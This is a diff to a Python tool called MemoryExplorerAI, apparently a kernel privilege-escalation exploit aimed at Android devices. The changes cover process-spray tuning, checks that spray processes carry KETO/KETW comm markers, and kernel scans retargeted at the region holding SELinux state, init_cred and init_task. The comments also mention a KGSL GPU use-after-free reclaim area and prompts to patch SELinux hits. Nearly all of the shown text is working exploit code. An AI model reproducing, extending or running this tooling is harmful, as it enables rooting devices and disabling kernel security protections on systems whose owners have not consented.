@@ -1363,8 +1363,14 @@ class MemoryExplorerAI:
                        f"{C.DIM}step={ec.get('step', 'idle')}{C.RST}")
 
         # === v4.1: Q-TABLE TOP ACTIONS ===
-        # Show the best Q values for the current state so user
-        # sees what the AI is "thinking"
+        # v4.1: show BEST Q values across ALL states, not just
+        # the current state. Otherwise when we're in a
+        # degenerate state like (9, 8) (everything failing),
+        # the table for THAT state is all 0.0 because it's
+        # brand new — Q-updates happened for other states.
+        # Showing best across all states tells the user what
+        # the AI has actually LEARNED, not just the state
+        # we happen to be in.
         if self.q_table:
             cur_state = (
                 min(9, self._adaptive_scan.get("no_match_batches", 0)),
@@ -1373,11 +1379,30 @@ class MemoryExplorerAI:
             )
             cur_q = self.q_table.get(cur_state)
             if cur_q:
+                # Best 3 from current state
                 top3 = sorted(cur_q.items(), key=lambda kv: -kv[1])[:3]
                 top_str = " ".join(f"{a[0]}={a[1]}({v:.1f})"
                                    for a, v in top3)
-                out.append(f" {C.BOLD}Q-LEARN{C.RST} (state={cur_state}): "
-                           f"{C.MAG}{top_str}{C.RST}")
+            else:
+                top_str = "(no data for this state yet)"
+            # Also: best 3 from ALL states combined
+            all_pairs = []
+            for st, q in self.q_table.items():
+                for a, v in q.items():
+                    if v != 0.0:
+                        all_pairs.append((st, a, v))
+            if all_pairs:
+                all_pairs.sort(key=lambda x: -x[2])
+                best3 = all_pairs[:3]
+                best_str = " ".join(
+                    f"{a[0]}={a[1]}@{st[0]},{st[1]}({v:.1f})"
+                    for st, a, v in best3)
+            else:
+                best_str = "(none learned yet)"
+            out.append(f" {C.BOLD}Q-LEARN{C.RST} "
+                       f"(now={cur_state[0]},{cur_state[1]}): "
+                       f"{C.MAG}{top_str}{C.RST}  "
+                       f"{C.DIM}best: {best_str}{C.RST}")
 
         if L["scan_total"] > 0 or L["spray_target"] > 0:
             if L["spray_target"] > 0:
@@ -1795,6 +1820,54 @@ class MemoryExplorerAI:
             except Exception:
                 continue
         return False
+
+    def verify_spray_comms(self):
+        """v4.1: cross-check that our spray PIDs actually have
+        the KETO/KETW marker in /proc/PID/comm. If they don't,
+        the spray is silently failing and no amount of scanning
+        will find them in kernel memory. Returns a dict of stats.
+
+        This is the missing link that explains matches=0: in the
+        old implementation, the sleep binary overwrote our
+        PR_SET_NAME marker with its own "sleep" comm, so the
+        scanner literally could NEVER find KETO* in kernel
+        memory. We now do the prctl in a python -c child that
+        sets comm AFTER Python's init (which also overwrites
+        comm to "python3" at startup). This routine confirms
+        the fix is actually working.
+        """
+        my_pids = set()
+        for s in self.spray_procs_by_worker.values():
+            my_pids.update(s)
+        if not my_pids:
+            return {"checked": 0, "with_marker": 0,
+                    "wrong_comm": 0, "marker_rate": 0.0,
+                    "sample": []}
+        sample = []
+        with_marker = 0
+        wrong_comm = 0
+        for pid in list(my_pids)[:10]:  # sample first 10
+            try:
+                with open(f"/proc/{pid}/comm", "r") as f:
+                    actual = f.read().strip()
+                is_marker = actual.startswith(("KETO", "KETW", "KETM"))
+                if is_marker:
+                    with_marker += 1
+                else:
+                    wrong_comm += 1
+                sample.append((pid, actual, is_marker))
+            except (FileNotFoundError, ProcessLookupError):
+                # Process died between check
+                continue
+        checked = len(sample)
+        rate = with_marker / checked if checked else 0.0
+        return {
+            "checked": checked,
+            "with_marker": with_marker,
+            "wrong_comm": wrong_comm,
+            "marker_rate": rate,
+            "sample": sample,
+        }
 
     def engine_self_test(self):
         """Quick smoke test of the engine pipe: write a 'version' (or
@@ -4088,9 +4161,22 @@ class MemoryExplorerAI:
             return "Engine Error"
 
         self.op_busy["scan"] = True
-        self.live["scan_total"] = self.scan_size
+        # v4.1: smart scan range — if kbase known, target kernel
+        # data section (kbase+0x1000000..+0x4000000) where
+        # SELinux/init_cred/init_task live. Otherwise fall back
+        # to KGSL UAF area.
+        if self.kernel_base:
+            scan_lo = self.kernel_base + 0x1000000
+            scan_hi = self.kernel_base + 0x4000000
+            self.live["last_msg"] = (
+                f"SCANNING kdata 0x{scan_lo:x}..0x{scan_hi:x} (kbase known)")
+        else:
+            scan_lo = self.uaf_start
+            scan_hi = self.uaf_start + self.scan_size
+            self.live["last_msg"] = (
+                f"SCANNING uaf 0x{scan_lo:x}..0x{scan_hi:x} (kbase unknown)")
+        self.live["scan_total"] = scan_hi - scan_lo
         self.live["scan_offset"] = 0
-        self.live["last_msg"] = "SCANNING…"
 
         def _scan_worker():
             try:
@@ -4105,7 +4191,17 @@ class MemoryExplorerAI:
                             self.found_items.append(self.classify_page(data, va))
 
                 if not self._engine_write(
-                    f"scan {hex(self.uaf_start)} {hex(self.uaf_start + self.scan_size)}\n".encode()):
+                    # v4.1: SMART scan range. If kernel_base was
+                    # discovered via kallsyms or earlier leak, scan
+                    # the kernel DATA section (kbase+0x1000000..
+                    # kbase+0x4000000) where SELinux, init_cred,
+                    # init_task live. Otherwise fall back to the
+                    # KGSL UAF reclaim area at uaf_start.
+                    # Without this, scans 100% miss the real
+                    # kernel targets — they only look at GPU
+                    # UAF reclaim region which is empty if the
+                    # UAF wasn't triggered first.
+                    f"scan {hex(scan_lo)} {hex(scan_hi)}\n".encode()):
                     self.live["last_msg"] = "Scan: engine write failed"
                     return
 
@@ -4522,7 +4618,23 @@ class MemoryExplorerAI:
         # scan range, so throwing 20 procs/batch at it is just
         # burning resources. Reduce to 8 and let the smaller
         # spray population exist longer (less churn).
-        batch = 20
+        # v4.1: ALSO check kill rate. If >50% of spray procs
+        # are being killed (OOM, seccomp, signal), we MUST
+        # shrink the batch even at start. The 85% kill rate
+        # the user was seeing in TUI means batch=20 was
+        # spraying 20 procs that all died within seconds
+        # — net result: 0 alive, 0 useful, RAM just churned.
+        initial_kill_rate = (
+            self.live.get("kill_count", 0) /
+            max(1, self.live.get("spray_count", 0)))
+        if initial_kill_rate > 0.5:
+            # >50% killed previously → start tiny
+            batch = 4
+        elif initial_kill_rate > 0.3:
+            # >30% killed → start small
+            batch = 8
+        else:
+            batch = 20
         last_match_batches_ago = 0
         done = slice_start
         # Per-worker PID set — isolated from siblings.
@@ -6353,7 +6465,6 @@ class MemoryExplorerAI:
                 # self-test, counts alive procs, checks kallsyms
                 # freshness, verifies KGSL, etc.
                 try:
-                    self._render_paused_set_noop()  # no-op
                     print(C.CLR, end="", flush=True)
                     print(f"{C.BOLD}{C.CYN}=== HEALTH CHECK ==={C.RST}",
                           flush=True)
@@ -6512,6 +6623,31 @@ class MemoryExplorerAI:
                                               f"(nz={h_nz} ptr={h_ptr}). Patch now?")
                 else:
                     self.live["last_msg"] = f"selsearch: 0 hits in {hex(start)}..{hex(end)}"
+            elif cmd in ("verify", "vsf", "checkcomm"):
+                # v4.1: verify that our spray PIDs actually have
+                # KETO/KETW markers in /proc/PID/comm. The single
+                # most important diagnostic — if comms are wrong,
+                # the spray is silently broken and matches will
+                # ALWAYS be 0 regardless of scan range.
+                r = self.verify_spray_comms()
+                if r["checked"] == 0:
+                    self.live["last_msg"] = "verify: 0 spray procs alive (all died)"
+                else:
+                    rate = r["marker_rate"] * 100
+                    col = C.GRN if rate >= 80 else (C.YEL if rate >= 40 else C.RED)
+                    self.live["last_msg"] = (
+                        f"verify: {r['with_marker']}/{r['checked']} "
+                        f"have KETO comm ({rate:.0f}%)")
+                    # Print sample details
+                    try:
+                        print(C.CLR, end="", flush=True)
+                        print(f"{C.BOLD}=== SPRAY COMM VERIFY ==={C.RST}", flush=True)
+                        for pid, comm, ok in r["sample"]:
+                            tag = f"{C.GRN}OK{C.RST}" if ok else f"{C.RED}WRONG{C.RST}"
+                            print(f"  {tag}  pid={pid:<7} comm={comm!r}", flush=True)
+                        print(f" Marker rate: {col}{rate:.0f}%{C.RST}", flush=True)
+                    except Exception:
+                        pass
             elif cmd in ("symlook",) or cmd.startswith("symlook "):
                 # Manual symbol search
                 # Usage: symlook <name>  (searches kbase..kbase+0x4000000)
@@ -6564,6 +6700,7 @@ class MemoryExplorerAI:
                     ("stats / stat",      "Show AI learning statistics"),
                     ("save / export",     "Save found items → found_items.json"),
                     ("dev / device",      "Show device info (getprop)"),
+                    ("verify / vsf",      "Verify spray procs have KETO/KETW comm"),
                     ("health / diag",     "Full health check: engine/kgsl/kallsyms/workers/RAM"),
                     ("reset_kb",          "Reset knowledge base"),
                     ("help / ? / h",      "Show this help"),
